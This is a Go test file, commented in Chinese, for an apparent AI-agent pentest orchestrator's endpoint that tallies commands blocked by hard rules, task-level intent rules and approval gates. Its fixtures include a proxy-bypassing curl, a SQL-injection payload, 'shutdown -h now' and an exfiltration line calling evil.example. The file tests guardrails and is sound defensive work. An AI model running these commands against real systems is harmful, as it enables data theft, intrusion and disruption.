package server

import (
	"encoding/json"
	"net/http"
	"testing"

	"ghostreaper/internal/rings"
)

// ---- P4-07:拦截命中统计(对账一致 / 走向推导 / 高频排序 / 轨迹下钻)----

// seedInterceptTask 造一个任务,覆盖四类命中与三种走向:
// ① s1 被拒前已在跑(被拒后完成,不算换路)② s2/u1 硬规则拒,之后新
// 步骤 s3 派发到完成(换路成功继续)③ s4/u2 硬规则拒,任务随后停止
// (任务已停止)④ s5/u3 意图拦截拒,单位继续 2 次调用后正常收场
// (换路成功继续)⑤ 弹门三例:批准 / 面板拒绝 / 待决。
func seedInterceptTask(t *testing.T, srv *Server) string {
	t.Helper()
	const task = "p407-task"
	_, err := srv.Store.Append(t.Context(), task,
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "created", Title: "P4-07 拦截命中"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "started"}},
		// s1:被拒前已在跑(其完成不构成换路)。
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s1", NodeType: rings.NodeStep,
				Title: "路径枚举", Status: "running"}},
		// ① s2/u1 硬规则拒绝;随后 s3 新派发到完成 → 换路成功继续。
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s2", NodeType: rings.NodeStep,
				Title: "直连对照复测", Status: "running"}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u1",
			Payload: rings.ApprovalRecord{RequestID: "ap-d1", StepID: "s2", UnitID: "u1",
				Type: rings.ApprovalRecDenied, ActionLevel: "主动测试",
				Intent: "直连对照复测", ToolName: "bash",
				ToolArgs: []byte(`{"command":"curl --noproxy '*' http://127.0.0.1/"}`),
				DenyLine: rings.DenyLineHardRule,
				Reason:   `内置硬规则命中:代理旁路 · curl 绕过代理(命中片段 "--noproxy")`}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u1",
			Payload: rings.NodeStateChanged{NodeID: "s2", Status: "approval_denied"}},
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s3", NodeType: rings.NodeStep,
				Title: "经镜代理对照复测", Status: "dispatched"}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "overmind",
			Payload: rings.NodeStateChanged{NodeID: "s3", Status: "running"}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u2",
			Payload: rings.NodeStateChanged{NodeID: "s1", Status: "done"}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u2",
			Payload: rings.NodeStateChanged{NodeID: "s3", Status: "done"}},
		// ② s4/u2 硬规则拒绝;任务随后停止 → 任务已停止。
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s4", NodeType: rings.NodeStep,
				Title: "备份目录探测", Status: "running"}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u2",
			Payload: rings.ApprovalRecord{RequestID: "ap-d2", StepID: "s4", UnitID: "u2",
				Type: rings.ApprovalRecDenied, ActionLevel: "主动测试",
				Intent: "备份目录探测", ToolName: "bash",
				ToolArgs: []byte(`{"command":"curl --noproxy '*' http://127.0.0.1/.bak"}`),
				DenyLine: rings.DenyLineHardRule,
				Reason:   `内置硬规则命中:代理旁路 · curl 绕过代理(命中片段 "--noproxy")`}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u2",
			Payload: rings.NodeStateChanged{NodeID: "s4", Status: "approval_denied"}},
		// ③ s5/u3 意图拦截拒绝(不熔断);单位继续 2 次调用后正常收场。
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s5", NodeType: rings.NodeStep,
				Title: "表单注入验证", Status: "running"}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u3",
			Payload: rings.SwarmRecord{StepID: "s5", UnitID: "u3", TranscriptID: "swarm-u3",
				Type: rings.SwarmRecSessionStarted}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u3",
			Payload: rings.ApprovalRecord{RequestID: "ap-d3", StepID: "s5", UnitID: "u3",
				Type: rings.ApprovalRecDenied, ActionLevel: "主动测试",
				Intent: "表单注入验证", ToolName: "bash",
				ToolArgs: []byte(`{"command":"curl -d \"' or 1=1 --\" http://web-1.example/q"}`),
				DenyLine: rings.DenyLineIntentRule,
				Reason:   "任务级拦截:禁止对 web-1.example 做注入测试"}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u3",
			Payload: rings.SwarmRecord{StepID: "s5", UnitID: "u3", Type: rings.SwarmRecToolCall,
				ToolName: "bash", ToolArgs: []byte(`{"command":"curl http://web-1.example/q?id=2"}`)}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u3",
			Payload: rings.SwarmRecord{StepID: "s5", UnitID: "u3", Type: rings.SwarmRecToolCall,
				ToolName: "bash", ToolArgs: []byte(`{"command":"curl http://web-1.example/q?id=3"}`)}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u3",
			Payload: rings.NodeStateChanged{NodeID: "s5", Status: "done"}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u3",
			Payload: rings.SwarmRecord{StepID: "s5", UnitID: "u3", TranscriptID: "swarm-u3",
				Type: rings.SwarmRecSessionEnd,
				Note: "reason=completed turns=4 status=done billable=9s gate_wait=0s block_wait=0s pause_wait=0s"}},
		// ④ 弹门三例(同规则两例 + 异规则待决一例)。
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u2",
			Payload: rings.ApprovalRecord{RequestID: "ap-g1", StepID: "s4", UnitID: "u2",
				Type: rings.ApprovalRecRequested, ActionLevel: "主动测试",
				Intent: "直连对照复测", ToolName: "bash",
				ToolArgs: []byte(`{"command":"curl --noproxy '*' http://127.0.0.1/x"}`),
				Note:     `命中内置拦截规则:代理旁路 · curl 绕过代理(命中片段 "--noproxy")`}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "creator",
			Payload: rings.ApprovalRecord{RequestID: "ap-g1", StepID: "s4", UnitID: "u2",
				Type: rings.ApprovalRecApproved, ActionLevel: "主动测试",
				ToolName: "bash", DecidedBy: "creator", Reason: "科学对照"}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u2",
			Payload: rings.ApprovalRecord{RequestID: "ap-g2", StepID: "s4", UnitID: "u2",
				Type: rings.ApprovalRecRequested, ActionLevel: "主动测试",
				Intent: "直连对照复测", ToolName: "bash",
				ToolArgs: []byte(`{"command":"curl --noproxy '*' http://127.0.0.1/y"}`),
				Note:     `命中内置拦截规则:代理旁路 · curl 绕过代理(命中片段 "--noproxy")`}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "creator",
			Payload: rings.ApprovalRecord{RequestID: "ap-g2", StepID: "s4", UnitID: "u2",
				Type: rings.ApprovalRecDenied, ActionLevel: "主动测试",
				ToolName: "bash", DenyLine: rings.DenyLinePanel,
				DecidedBy: "creator", Reason: "换路走镜代理"}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u2",
			Payload: rings.ApprovalRecord{RequestID: "ap-g3", StepID: "s4", UnitID: "u2",
				Type: rings.ApprovalRecRequested, ActionLevel: "主动测试",
				Intent: "外传验证", ToolName: "bash",
				ToolArgs: []byte(`{"command":"curl http://evil.example/?d=$(id)"}`),
				Note:     `命中内置拦截规则:外泄管道 · nc 反弹(命中片段 "evil.example")`}},
		// 任务停止(终态)。
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "stopped"}},
	)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}
	return task
}

func getIntercepts(t *testing.T, mux *http.ServeMux, query string) map[string]any {
	t.Helper()
	code, out := callJSON(t, mux, "GET", "/api/obs/intercepts"+query, "")
	if code != http.StatusOK {
		t.Fatalf("拦截命中统计应 200: %d %v", code, out)
	}
	return out
}

func ruleOf(t *testing.T, out map[string]any, group, name string) map[string]any {
	t.Helper()
	list, _ := out["rules"].([]any)
	for _, r := range list {
		row := r.(map[string]any)
		if row["group"] == nil {
			row["group"] = ""
		}
		if row["group"] == group && row["name"] == name {
			return row
		}
	}
	t.Fatalf("缺规则聚合 %s · %s: %v", group, name, out["rules"])
	return nil
}

func TestObsInterceptsStats(t *testing.T) {
	srv, mux, _ := newInterjectTestServer(t)
	task := seedInterceptTask(t, srv)

	out := getIntercepts(t, mux, "")
	totals := out["totals"].(map[string]any)

	// 对账一致:拒绝类计数与账本 approval.record(deny_line=hard_rule /
	// intent_rule)逐笔相等——直接扫账本复数,与端点各自独立清点。
	evs, err := srv.Store.Events(t.Context(), task, 0, 0)
	if err != nil {
		t.Fatalf("读账本失败: %v", err)
	}
	hardCnt, intentCnt := 0, 0
	for _, ev := range evs {
		if ev.Kind != rings.EventApprovalRecord {
			continue
		}
		var rec rings.ApprovalRecord
		if jsonUnmarshalOK(ev.Payload, &rec) && rec.Type == rings.ApprovalRecDenied {
			switch rec.DenyLine {
			case rings.DenyLineHardRule:
				hardCnt++
			case rings.DenyLineIntentRule:
				intentCnt++
			}
		}
	}
	if hardCnt != 2 || intentCnt != 1 {
		t.Fatalf("账本拒绝类清点应为 2 硬规则 + 1 意图拦截: %d/%d", hardCnt, intentCnt)
	}
	if totals["denied"] != float64(hardCnt+intentCnt) {
		t.Fatalf("统计总数应与账本对账一致: %v vs %d", totals["denied"], hardCnt+intentCnt)
	}

	// 高频排序:代理旁路(4 命中)居首。
	list := out["rules"].([]any)
	first := firstRule(t, out)
	if first["group"] != "代理旁路" || first["name"] != "curl 绕过代理" {
		t.Fatalf("高频规则应居首: %v", first)
	}

	// 代理旁路聚合:2 拒绝 + 2 弹门(批准 1 / 面板拒绝 1)= 4 命中。
	px := ruleOf(t, out, "代理旁路", "curl 绕过代理")
	if px["hits"] != float64(4) || px["denied"] != float64(2) || px["gate"] != float64(2) {
		t.Fatalf("代理旁路计数错: %v", px)
	}
	if px["approved"] != float64(1) || px["panel_denied"] != float64(1) || px["pending"] != float64(0) {
		t.Fatalf("弹门裁决分布错: %v", px)
	}
	// 走向分布:d1 与 d2 之后均有新步骤完成(s3/s5)→ 换路成功继续 2;
	// g2 面板拒绝(裁决笔之后零新完成)→ 任务已停止 1。
	follows := px["follows"].(map[string]any)
	if follows["rerouted"] != float64(2) || follows["task_stopped"] != float64(1) {
		t.Fatalf("走向分布错: %v", follows)
	}

	// 意图拦截聚合:身份 = 动作 · 范围;单位继续 2 次调用后完成 → 换路成功继续。
	ij := ruleOf(t, out, "", "注入测试 · web-1.example")
	if ij["line"] != "intent_rule" || ij["denied"] != float64(1) {
		t.Fatalf("意图拦截聚合错: %v", ij)
	}
	ijRecent := ij["recent"].([]any)[0].(map[string]any)
	ijFollow := ijRecent["follow"].(map[string]any)
	if ijFollow["outcome"] != "rerouted" || ijFollow["unit_calls"] != float64(2) {
		t.Fatalf("意图拦截走向错(应换路成功继续且单位继续 2 次调用): %v", ijFollow)
	}
	if ijFollow["unit_end"] != "完成" {
		t.Fatalf("单位收场词错: %v", ijFollow["unit_end"])
	}

	// 待决弹门(异规则)保持 pending、无走向。
	nc := ruleOf(t, out, "外泄管道", "nc 反弹")
	if nc["pending"] != float64(1) || nc["denied"] != float64(0) {
		t.Fatalf("外泄管道应 1 待决: %v", nc)
	}
	if nc["recent"].([]any)[0].(map[string]any)["outcome"] != "pending" {
		t.Fatalf("待决命中行结局错: %v", nc["recent"])
	}

	// 批准的弹门命中不携带走向。
	approvedRow := hitByOutcome(t, px, "approved")
	if approvedRow["follow"] != nil {
		t.Fatalf("批准命中不应携带走向: %v", approvedRow)
	}
	// 任务过滤:限定本任务聚合不变,限定不存在任务为空。
	if filtered := getIntercepts(t, mux, "?task="+task); len(filtered["rules"].([]any)) != len(list) {
		t.Fatalf("任务过滤后规则数应不变: %v", filtered["rules"])
	}
	if empty := getIntercepts(t, mux, "?task=no-such"); empty["totals"].(map[string]any)["rules"] != float64(0) {
		t.Fatalf("不存在任务应为空: %v", empty)
	}
}

// TestObsInterceptsTrajectory 轨迹下钻:被拒后的时间线含新步骤派发到
// 完成、被拒时已在跑步骤的收好(如实但不计换路)与任务停止。
func TestObsInterceptsTrajectory(t *testing.T) {
	srv, mux, _ := newInterjectTestServer(t)
	seedInterceptTask(t, srv)

	out := getIntercepts(t, mux, "")
	px := ruleOf(t, out, "代理旁路", "curl 绕过代理")
	// 近期新到旧:最新命中是弹门 g2(面板拒绝),其次 g1(批准)、d2、d1。
	recent := px["recent"].([]any)
	d1 := rowByStep(t, recent, "s2", "denied_hard")
	follow := d1["follow"].(map[string]any)
	// 新完成步骤 = s3 与 s5(均在锚后新出现并完成;s1 是被拒前已在跑的
	// 步骤,其完成入轨迹但不计数)。
	if follow["outcome"] != "rerouted" || follow["steps_done"] != float64(2) {
		t.Fatalf("d1 走向应换路成功继续且新完成步骤数 2: %v", follow)
	}
	texts := []string{}
	for _, e := range follow["events"].([]any) {
		texts = append(texts, e.(map[string]any)["text"].(string))
	}
	hasText := func(w string) bool {
		for _, x := range texts {
			if x == w {
				return true
			}
		}
		return false
	}
	// s3(新步骤)派发→开始执行→完成;s1(被拒前已在跑)完成在时间线;
	// s2 自身的拒绝终态在锚后、入轨迹(时间线从被拒那一刻说起);任务
	// 停止收尾。
	for _, w := range []string{
		"步骤 s2 · 审批拒绝终止", "步骤 s3 · 派发", "步骤 s3 · 开始执行",
		"步骤 s3 · 完成", "步骤 s1 · 完成", "任务停止",
	} {
		if !hasText(w) {
			t.Fatalf("轨迹缺 %q: %v", w, texts)
		}
	}
	// 任务当前状态词随行。
	if follow["task_now"] != "已停止" {
		t.Fatalf("任务当前状态词错: %v", follow["task_now"])
	}
}

// TestObsInterceptsFollowOutcomes 走向推导的其余取值:任务完成 / 卡死 /
// 继续中 / 已暂停 / 单位后续受阻;空账本为空视图。
func TestObsInterceptsFollowOutcomes(t *testing.T) {
	srv, mux, _ := newInterjectTestServer(t)

	// 任务 A:拒绝后新步骤完成且任务完成 → 换路成功·任务完成。
	const ta = "p407-a"
	_, err := srv.Store.Append(t.Context(), ta,
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "created", Title: "A"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "started"}},
		denyEvent("ap-a", "s1", "u1", "备份目录探测"),
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s2", NodeType: rings.NodeStep,
				Title: "换路", Status: "dispatched"}},
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u2",
			Payload: rings.NodeStateChanged{NodeID: "s2", Status: "done"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "completed"}},
	)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}

	// 任务 B:拒绝后无新派发、零在队零在跑、任务仍运行 → 卡死。
	const tb = "p407-b"
	_, err = srv.Store.Append(t.Context(), tb,
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "created", Title: "B"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "started"}},
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s1", NodeType: rings.NodeStep,
				Title: "探测", Status: "running"}},
		denyEvent("ap-b", "s1", "u1", "直连对照复测"),
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u1",
			Payload: rings.NodeStateChanged{NodeID: "s1", Status: "approval_denied"}},
	)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}

	// 任务 C:拒绝后另一步骤仍在队 → 继续中。
	const tc = "p407-c"
	_, err = srv.Store.Append(t.Context(), tc,
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "created", Title: "C"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "started"}},
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s1", NodeType: rings.NodeStep,
				Title: "探测", Status: "running"}},
		denyEvent("ap-c", "s1", "u1", "直连对照复测"),
		rings.Event{Kind: rings.EventNodeStateChanged, Actor: "swarm:u1",
			Payload: rings.NodeStateChanged{NodeID: "s1", Status: "approval_denied"}},
		rings.Event{Kind: rings.EventNodeAdded, Actor: "overmind",
			Payload: rings.NodeAdded{NodeID: "s2", NodeType: rings.NodeStep,
				Title: "在队", Status: "dispatched"}},
	)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}

	// 任务 D:拒绝后任务暂停 → 已暂停。
	const td = "p407-d"
	_, err = srv.Store.Append(t.Context(), td,
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "created", Title: "D"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "started"}},
		denyEvent("ap-d", "s1", "u1", "直连对照复测"),
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "paused"}},
	)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}

	// 任务 E:意图拦截拒后单位最终受阻 → 卡死(超额拒绝原因同身解析)。
	const te = "p407-e"
	_, err = srv.Store.Append(t.Context(), te,
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "created", Title: "E"}},
		rings.Event{Kind: rings.EventTaskLifecycle, Actor: "manager",
			Payload: rings.TaskLifecycle{Action: "started"}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u1",
			Payload: rings.SwarmRecord{StepID: "s1", UnitID: "u1", TranscriptID: "swarm-u1",
				Type: rings.SwarmRecSessionStarted}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u1",
			Payload: rings.ApprovalRecord{RequestID: "ap-e", StepID: "s1", UnitID: "u1",
				Type: rings.ApprovalRecDenied, ToolName: "bash",
				DenyLine: rings.DenyLineIntentRule,
				Reason:   "任务级拦截:对 web-2.example 的爬取已用满 3 次上限,自动转禁止"}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u1",
			Payload: rings.SwarmRecord{StepID: "s1", UnitID: "u1", TranscriptID: "swarm-u1",
				Type: rings.SwarmRecSessionEnd, Resumable: true,
				Note: "reason=model_error turns=3 status=blocked billable=3.5s gate_wait=0s block_wait=1s pause_wait=0s"}},
	)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}

	cases := []struct{ task, ruleName, want string }{
		{ta, "curl 绕过代理", "rerouted_complete"},
		{tb, "curl 绕过代理", "stalled"},
		{tc, "curl 绕过代理", "active"},
		{td, "curl 绕过代理", "paused"},
		{te, "爬取 · web-2.example", "stalled"},
	}
	for _, c := range cases {
		out := getIntercepts(t, mux, "?task="+c.task)
		list, _ := out["rules"].([]any)
		if len(list) != 1 {
			t.Fatalf("任务 %s 应恰一条规则聚合: %v", c.task, out["rules"])
		}
		row := list[0].(map[string]any)
		if row["name"] != c.ruleName {
			t.Fatalf("任务 %s 规则身份错: %v", c.task, row["name"])
		}
		follow := row["recent"].([]any)[0].(map[string]any)["follow"].(map[string]any)
		if follow["outcome"] != c.want {
			t.Fatalf("任务 %s 走向应为 %s: %v", c.task, c.want, follow)
		}
	}

	// 空视图:无命中的账本返回空聚合(前端空态)。
	const tf = "p407-f"
	if _, err := srv.Store.Append(t.Context(), tf, rings.Event{
		Kind: rings.EventTaskLifecycle, Actor: "manager",
		Payload: rings.TaskLifecycle{Action: "created", Title: "F"},
	}); err != nil {
		t.Fatalf("造数失败: %v", err)
	}
	empty := getIntercepts(t, mux, "?task="+tf)
	if e := empty["totals"].(map[string]any); e["rules"] != float64(0) || e["hits"] != float64(0) {
		t.Fatalf("无命中任务应为空视图: %v", e)
	}
}

// denyEvent 造一笔硬规则拒绝(代理旁路,同 seedInterceptTask 的规则身份)。
func denyEvent(req, step, unit, intent string) rings.Event {
	return rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:" + unit,
		Payload: rings.ApprovalRecord{RequestID: req, StepID: step, UnitID: unit,
			Type: rings.ApprovalRecDenied, ActionLevel: "主动测试",
			Intent: intent, ToolName: "bash",
			ToolArgs: []byte(`{"command":"curl --noproxy '*' http://127.0.0.1/"}`),
			DenyLine: rings.DenyLineHardRule,
			Reason:   `内置硬规则命中:代理旁路 · curl 绕过代理(命中片段 "--noproxy")`}}
}

func jsonUnmarshalOK(raw []byte, v any) bool {
	return json.Unmarshal(raw, v) == nil
}

func firstRule(t *testing.T, out map[string]any) map[string]any {
	t.Helper()
	list, ok := out["rules"].([]any)
	if !ok || len(list) == 0 {
		t.Fatalf("规则聚合为空: %v", out)
	}
	return list[0].(map[string]any)
}

func hitByOutcome(t *testing.T, rule map[string]any, outcome string) map[string]any {
	t.Helper()
	for _, h := range rule["recent"].([]any) {
		row := h.(map[string]any)
		if row["outcome"] == outcome {
			return row
		}
	}
	t.Fatalf("缺结局 %s 的命中行: %v", outcome, rule["recent"])
	return nil
}

func rowByStep(t *testing.T, recent []any, step, outcome string) map[string]any {
	t.Helper()
	for _, h := range recent {
		row := h.(map[string]any)
		if row["step_id"] == step && row["outcome"] == outcome {
			return row
		}
	}
	t.Fatalf("缺步骤 %s 结局 %s 的命中行: %v", step, outcome, recent)
	return nil
}

// TestObsInterceptsP463Disposition P4-63 B 新处置形态可见:① 硬规则拒后
// 单位存活继续干活——走向呈"换路成功继续"且 unit_calls>0(被拒后继续
// 的工具调用数);② 升级杀的拒绝原因带"同规则累计命中 3 次"尾注,规则
// 身份仍按前缀正确解析(组·名)。
func TestObsInterceptsP463Disposition(t *testing.T) {
	srv, mux, _ := newInterjectTestServer(t)

	// 任务 A:硬规则拒(关机命令)后单位换只读命令继续、正常收场。
	const ta = "p463-obs-a"
	lifecycle := []rings.Event{
		{Kind: rings.EventTaskLifecycle, Actor: "manager", Payload: rings.TaskLifecycle{Action: "created", Title: "A"}},
		{Kind: rings.EventTaskLifecycle, Actor: "manager", Payload: rings.TaskLifecycle{Action: "started"}},
	}
	_, err := srv.Store.Append(t.Context(), ta, append(lifecycle,
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u1",
			Payload: rings.SwarmRecord{StepID: "s1", UnitID: "u1", TranscriptID: "swarm-u1",
				Type: rings.SwarmRecSessionStarted}},
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u1",
			Payload: rings.ApprovalRecord{RequestID: "ap-a", StepID: "s1", UnitID: "u1",
				Type: rings.ApprovalRecDenied, ToolName: "bash",
				ToolArgs: []byte(`{"command":"shutdown -h now"}`),
				DenyLine: rings.DenyLineHardRule,
				Reason:   `内置硬规则命中:系统破坏命令 · 关机重启(命中片段 "shutdown")`}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u1",
			Payload: rings.SwarmRecord{StepID: "s1", UnitID: "u1", TranscriptID: "swarm-u1",
				Type: rings.SwarmRecToolCall, ToolName: "bash", ResultHead: "rerouted"}},
		rings.Event{Kind: rings.EventSwarmRecord, Actor: "swarm:u1",
			Payload: rings.SwarmRecord{StepID: "s1", UnitID: "u1", TranscriptID: "swarm-u1",
				Type: rings.SwarmRecSessionEnd,
				Note: "reason=completed turns=2 status=done billable=2s gate_wait=0s block_wait=0s pause_wait=0s"}},
	)...)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}
	out := getIntercepts(t, mux, "?task="+ta)
	rule := ruleOf(t, out, "系统破坏命令", "关机重启")
	if rule["denied"] != float64(1) {
		t.Fatalf("硬规则拒绝应计 1: %v", rule)
	}
	follow := rule["recent"].([]any)[0].(map[string]any)["follow"].(map[string]any)
	if follow["outcome"] != "rerouted" {
		t.Fatalf("拒后继续干活应呈换路成功继续: %v", follow)
	}
	if follow["unit_calls"] != float64(1) {
		t.Fatalf("被拒后继续的工具调用应计 1: %v", follow)
	}

	// 任务 B:同规则累计 3 次升级杀——尾注不影响规则身份解析。
	const tb = "p463-obs-b"
	_, err = srv.Store.Append(t.Context(), tb, append(lifecycle,
		rings.Event{Kind: rings.EventApprovalRecord, Actor: "swarm:u1",
			Payload: rings.ApprovalRecord{RequestID: "ap-b", StepID: "s1", UnitID: "u1",
				Type: rings.ApprovalRecDenied, ToolName: "bash",
				ToolArgs: []byte(`{"command":"shutdown -h now"}`),
				DenyLine: rings.DenyLineHardRule,
				Reason:   `内置硬规则命中:系统破坏命令 · 关机重启(命中片段 "shutdown") · 同规则累计命中 3 次,升级终止单位`}},
	)...)
	if err != nil {
		t.Fatalf("造数失败: %v", err)
	}
	out = getIntercepts(t, mux, "?task="+tb)
	if _, ok := out["rules"].([]any); !ok || len(out["rules"].([]any)) != 1 {
		t.Fatalf("升级杀拒绝应聚成一条规则: %v", out["rules"])
	}
	row := out["rules"].([]any)[0].(map[string]any)
	if row["group"] != "系统破坏命令" || row["name"] != "关机重启" {
		t.Fatalf("升级尾注不应破坏规则身份解析: %v", row)
	}
}
